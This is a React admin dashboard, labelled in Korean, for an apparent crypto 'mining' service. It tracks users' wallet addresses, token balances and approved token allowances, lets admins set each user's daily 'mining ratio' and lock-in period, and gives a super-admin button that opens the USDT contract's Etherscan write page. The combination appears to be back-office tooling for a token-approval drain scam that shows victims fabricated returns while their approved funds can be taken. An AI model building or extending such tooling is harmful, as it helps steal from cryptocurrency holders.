import React, { Dispatch, memo, SetStateAction, useEffect, useState, createContext, useContext, useCallback } from "react";
import {
    Input, Button, Checkbox, Select, Text, Stack, SimpleGrid, VStack,
    TableContainer, Table, Thead, Tbody, Tr, Th, Td,
} from "@chakra-ui/react";
import UseToastHooks from "@/hooks/UseToastHooks";
import { useSession } from "next-auth/react";
import axios from "axios";
import useSWR, { KeyedMutator } from "swr"
import { admin as admin_table } from "@/generated/prisma";
import { create } from "zustand";
import { UseDebounceHook } from "@/hooks/UseDebounceHook";

interface CheckboxState {
    selected: string[];
    isAllSelected: boolean;
    setAllSelected: (value: boolean) => void;
    setSelected: (value: string[]) => void;
};
const useSelectedCheckbox = create<CheckboxState>((set) => ({
    selected: [],
    isAllSelected: false,
    setAllSelected: (value: boolean) => set({ isAllSelected: value }),
    setSelected: (value: string[]) => set({ selected: value }),
}));

const OldUserListContext = createContext<{
    selectedWebsite: string;
    counter: number;
    hash: number;
    lock: number;
    isSuper: boolean;
}>({
    selectedWebsite: "all",
    counter: 0,
    hash: 0,
    lock: 0,
    isSuper: false
})
const fetcher = (url: string) => axios.get<any>(url).then((res) => res.data);

const Filter = ({ setSelectedWebsite, setHashRate, setCounter, setLock, mutate }: {
    setSelectedWebsite: Dispatch<SetStateAction<string>>;
    setHashRate: Dispatch<SetStateAction<number>>;
    setCounter: Dispatch<SetStateAction<number>>;
    setLock: React.Dispatch<React.SetStateAction<number>>;

    mutate: KeyedMutator<any>
}) => {
    const toast = UseToastHooks()
    const { selectedWebsite, counter, hash, lock } = useContext(OldUserListContext)
    const { status } = useSession()
    const { setAllSelected, selected, isAllSelected, setSelected } = useSelectedCheckbox();

    const isAuthenticated = status === "authenticated"

    const [allWebsites, setAllWebsites] = useState<admin_table[]>([]);

    useEffect(() => {
        const fetchAllWebsite = async () => {
            const response = await axios.get<{ admin: admin_table[] }>("/api/getAllWebsites");
            setAllWebsites(response.data.admin);
        };
        if (isAuthenticated) fetchAllWebsite();
    }, [isAuthenticated, selectedWebsite, counter]);

    const handleBulkUpdateHashRate = async () => {
        if (isAllSelected) {
            await axios.post("/api/bulkUpdateHashRate", {
                hash: hash,
                isAll: true,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        } else {
            await axios.post("/api/bulkUpdateHashRate", {
                hash: hash,
                addresses: selected,
                isAll: false,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        }
        toast.success("Hash Rate has been updated successfully", "Hash Rate Updated")
    }
    const handleBulkUpdateLockDay = async () => {
        if (isAllSelected) {
            await axios.post("/api/bulkUpdateLockDay", {
                lock: lock,
                isAll: true,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        } else {
            await axios.post("/api/bulkUpdateLockDay", {
                lock: lock,
                addresses: selected,
                isAll: false,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        }
        toast.success("Lock Day has been updated successfully", "Lock Day Updated")
    }
    const handleDeleteMiner = async () => {
        if (isAllSelected) {
            await axios.post("/api/deleteMiner", {
                minerAddress: [],
                isAll: true,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        } else {
            await axios.post("/api/deleteMiner", {
                minerAddress: selected,
                isAll: false,
            });
            setAllSelected(false);
            setSelected([]);
            setHashRate(0);
            mutate();
            setCounter(counter + 1);
        }
        toast.success("Miner has been deleted successfully", "Miner Deleted")
    }
    return (
        <Stack w={"100%"} direction={"row"} justify={"flex-start"} align={"center"}>
            <Select
                size={"sm"} placeholder="Select Website" w={"fit-content"} bgColor={"white"}
                onChange={(e) => setSelectedWebsite(e.target.value)}
            >
                {
                    allWebsites.map((website: any) => (
                        <option value={website.handle}>{website.handle}</option>
                    ))
                }
            </Select>
            <Stack direction={"row"} justify={"center"} align={"center"}>
                <Input
                    size={"sm"} type="number" bgColor={"white"} defaultValue={hash}
                    onChange={(e) => setHashRate(Number(e.target.value))}
                />
                <Button size={"sm"} colorScheme="teal" px={10} onClick={handleBulkUpdateHashRate}>마이닝 비율 수정</Button>
            </Stack>
            <Stack direction={"row"} justify={"center"} align={"center"}>
                <Input
                    size={"sm"} type="number" bgColor={"white"} defaultValue={lock}
                    onChange={(e) => setLock(Number(e.target.value))}
                />
                <Button size={"sm"} colorScheme="teal" px={10} onClick={handleBulkUpdateLockDay}>계약기간 수정</Button>
            </Stack>
            <Button size={"sm"} colorScheme="red" px={16} onClick={handleDeleteMiner}>삭제</Button>
        </Stack>
    );
}
const MinerRow = ({
    miner,
    mutate,
}: {
    miner: any;
    mutate: KeyedMutator<any>;
}) => {
    const { address, lastlogin, tokenbalance, numberofDays } = miner;
    const subdomain = miner.site.split(".")[0];
    const lastlogintolocalTime = new Date(lastlogin);

    const { isSuper } = useContext(OldUserListContext)
    const { isAllSelected, selected, setSelected } = useSelectedCheckbox();

    const [isLoading, setIsLoading] = useState(false);
    const [isEditing, setIsEditing] = useState(false);
    const [isEditingLockPeriod, setIsEditingLockPeriod] = useState(false);
    const [editNote, setEditNote] = useState(false);
    const [lockPeriod, setLockPeriod] = useState(numberofDays);
    const [hashRate, setHashRate] = useState(miner.hashRate);
    const [noteValue, setNoteValue] = useState(miner.note);

    const handleEdit = () => {
        setIsEditing(true);
    };
    const handleSave = async () => {
        const url = "/api/updateHashRate";
        const data = {
            address: address,
            hash: hashRate,
        };
        try {
            const res = await axios.post(url, data);
            console.log(res.data);
            mutate();
        } catch (err) {
            console.log(err);
        } finally {
            setIsEditing(false);
        }
    };
    const handleRefresh = async (address: string) => {
        setIsLoading(true);
        const url = "/api/updateTokenBalance";
        const data = {
            address: address,
        };
        try {
            const res = await axios.post(url, data);
            console.log(res.data);
            mutate();
        } catch (err) {
            console.log(err);
        } finally {
            setIsLoading(false);
        }
    };
    const handleEditLockPeriod = () => {
        setIsEditingLockPeriod(true);
    };
    const handleSaveLockPeriod = async () => {
        const url = "/api/updateLockPeriod";
        const data = {
            address: address,
            lockPeriod: lockPeriod,
        };
        try {
            const res = await axios.post(url, data);
            console.log(res.data);
            mutate();
        } catch (err) {
            console.log(err);
        } finally {
            setIsEditing(false);
            setIsEditingLockPeriod(false);
        }
    };
    const handleCheckbox = (e: boolean) => {
        if (e) {
            selected.push(address);
        } else {
            const index = selected.indexOf(address);
            selected.splice(index, 1);
        }
        setSelected(selected);
    };
    const handleSaveNote = async (note: string) => {
        const url = "/api/savenote";
        const data = {
            id: address,
            note: note,
        };
        setNoteValue(note);
        try {
            const res = await axios.post(url, data);
            console.log(res.data);
            mutate();
        } catch (err) {
            console.log(err);
        } finally {
            setEditNote(false);
        }
    }
    const debouncedSetNoteValue = useCallback(UseDebounceHook((value) => {
        handleSaveNote(value);
    }, 300), []); // 300ms debounce time

    return (
        <Tr>
            {
                isSuper && (
                    <Td>
                        <Checkbox
                            isChecked={
                                isAllSelected ? true : selected.includes(address) ? true : false
                            }
                            onChange={(e) => handleCheckbox(e.target.checked)}
                            size={"sm"}
                        />
                    </Td>
                )
            }
            <Td fontSize={"x-small"}>{subdomain === "www" ? "main site" : subdomain}</Td>
            <Td fontSize={"x-small"}>
                <Input
                    size="xs"
                    type="text"
                    value={noteValue}
                    onChange={(e) => debouncedSetNoteValue(e.target.value)}
                />
            </Td>
            <Td fontSize={"x-small"}>{address}</Td>
            <Td fontSize={"x-small"}>{lastlogintolocalTime.toLocaleString()}</Td>
            <Td fontSize={"x-small"}>
                <VStack
                    spacing={0}
                    justifyContent={"flex-start"}
                    w={"100%"}
                    alignItems={"flex-start"}
                >
                    {
                        tokenbalance.map((token: any) => (
                            <Text>{`${token.amount} ${token.symbol}`}</Text>
                        ))
                    }
                </VStack>
            </Td>
            <Td fontSize={"x-small"}>
                <VStack
                    spacing={0}
                    justifyContent={"flex-start"}
                    w={"100%"}
                    alignItems={"flex-start"}
                >
                    {
                        tokenbalance.map((token: any) => (
                            <Text>{`${token.approvedAmount} ${token.symbol}`}</Text>
                        ))
                    }
                </VStack>
            </Td>
            <Td fontSize={"x-small"}>
                {
                    isEditing ? (
                        <Input
                            size="xs"
                            type="number"
                            value={hashRate}
                            onChange={(e) => setHashRate(parseFloat(e.target.value))}
                        />
                    ) : (
                        `${hashRate} % Daily`
                    )
                }
            </Td>
            <Td fontSize={"x-small"}>
                <VStack
                    spacing={0}
                    justifyContent={"flex-start"}
                    w={"100%"}
                    alignItems={"flex-start"}
                >
                    {
                        tokenbalance.map((token: any) => (
                            <Text>{`${parseFloat(token.accumulatedAmount).toFixed(5)} ${token.symbol}`}</Text>
                        ))
                    }
                </VStack>
            </Td>
            <Td fontSize={"x-small"}>
                {
                    isEditingLockPeriod ? (
                        <Input
                            size="sm"
                            type="number"
                            value={lockPeriod}
                            onChange={(e) => setLockPeriod(parseInt(e.target.value))}
                        />
                    ) : (
                        `${lockPeriod} Days`
                    )
                }
            </Td>
            {
                isSuper && (
                    <Td>
                        <SimpleGrid w={"300px"} columns={2} spacing={1}>
                            <Button
                                w={"100%"}
                                size={"xs"}
                                colorScheme={"teal"}
                                onClick={async () => await handleRefresh(address)}
                                isLoading={isLoading}
                            >
                                잔액 새로 고침
                            </Button>
                            <Button
                                size={"xs"}
                                colorScheme={"purple"}
                                w={"100%"}
                                variant={"outline"}
                                onClick={isEditing ? handleSave : handleEdit}
                            >
                                {
                                    isEditing ? (
                                        "저장"
                                    ) : (
                                        "마이닝 비율 수정"
                                    )
                                }
                            </Button>
                            <Button
                                size={"xs"}
                                colorScheme={"orange"}
                                w={"100%"}
                                variant={"outline"}
                                onClick={
                                    isEditingLockPeriod
                                        ? handleSaveLockPeriod
                                        : handleEditLockPeriod
                                }
                            >
                                {
                                    isEditingLockPeriod ? (
                                        "저장"
                                    ) : (
                                        "계약기간 수정"
                                    )
                                }
                            </Button>
                            {
                                // Only super admin can access this button
                                isSuper && (
                                    <Button
                                        onClick={() => {
                                            const url = "https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#writeContract"
                                            // Open the etherscan link
                                            window.open(url, "_blank");
                                        }}
                                        size={"xs"}
                                        colorScheme={"yellow"}
                                        w={"100%"}
                                    >
                                        슈퍼 관리자
                                    </Button>
                                )
                            }
                        </SimpleGrid>
                    </Td>
                )
            }
        </Tr>
    );
};

function OldUserList() {
    const url = "/api/getMiners";

    const { setAllSelected } = useSelectedCheckbox();
    const { data, mutate } = useSWR(url, fetcher, {
        refreshInterval: 6000,
    });

    const isSuper = false

    const [filteredData, setFilteredData] = useState<typeof data>();
    const [selectedWebsite, setSelectedWebsite] = useState<string>("all");
    const [counter, setCounter] = useState(0);
    const [hash, setHashRate] = useState(0);
    const [lock, setLock] = useState(0);

    useEffect(() => {
        if (selectedWebsite === "all") {
            setFilteredData(data);
        } else {
            const filtered = data?.data.filter((miner: any) => {
                return selectedWebsite.includes(miner.site);
            });
            setFilteredData({ data: filtered as any });
        }
    }, [selectedWebsite, data]);
    useEffect(() => {
        if (!isSuper) {
            const siteHandle = "all";
            setSelectedWebsite(siteHandle);
        }
    }, [isSuper, counter]);


    const tableHeaders = true
        ? [
            "회원 주소",
            "마지막 로그인",
            "총 잔액",
            "허용",
            "마이닝 비율",
            "마이닝 총액",
            "계약기간",
            "수정",
        ]
        : [
            "회원 주소",
            "마지막 로그인",
            "총 잔액",
            "허용",
            "마이닝 비율",
            "마이닝 총액",
            "계약기간",
        ];
    return (
        <OldUserListContext value={{ selectedWebsite, counter, hash, lock, isSuper }}>
            <Stack w={"100%"} h={"full"} p={3}>
                {
                    isSuper &&
                    <Filter
                        setSelectedWebsite={setSelectedWebsite}
                        setHashRate={setHashRate}
                        setCounter={setCounter}
                        mutate={mutate}
                        setLock={setLock}
                    />
                }
                <TableContainer w={"100%"} p={3} bgColor={"white"} rounded={"md"} shadow={"md"}>
                    <Table variant="simple" size={"md"}>
                        <Thead>
                            <Tr>
                                {
                                    isSuper && (
                                        <Th>
                                            <Checkbox
                                                onChange={(e) => setAllSelected(e.target.checked)}
                                                size={"sm"}
                                            />
                                        </Th>
                                    )
                                }
                                <Th>
                                    <Text fontSize={"small"}>
                                        Miner Site
                                    </Text>
                                </Th>
                                <Th>
                                    <Text fontSize={"small"}>
                                        Note
                                    </Text>
                                </Th>

                                {
                                    tableHeaders.map(header => (
                                        <Th>{header}</Th>
                                    ))
                                }
                            </Tr>
                        </Thead>
                        {
                            filteredData?.data?.length === 0 ? (
                                <Tbody>
                                    <Tr>
                                        <Td colSpan={8}>
                                            <Text textAlign={"center"}>No Data Found</Text>
                                        </Td>
                                    </Tr>
                                </Tbody>
                            ) : (
                                <Tbody>
                                    {
                                        filteredData?.data?.map((miner: any) => {
                                            return <MinerRow miner={miner} mutate={mutate} />;
                                        })
                                    }
                                </Tbody>
                            )
                        }
                    </Table>
                </TableContainer>
            </Stack>
        </OldUserListContext>
    );
}

export default memo(OldUserList)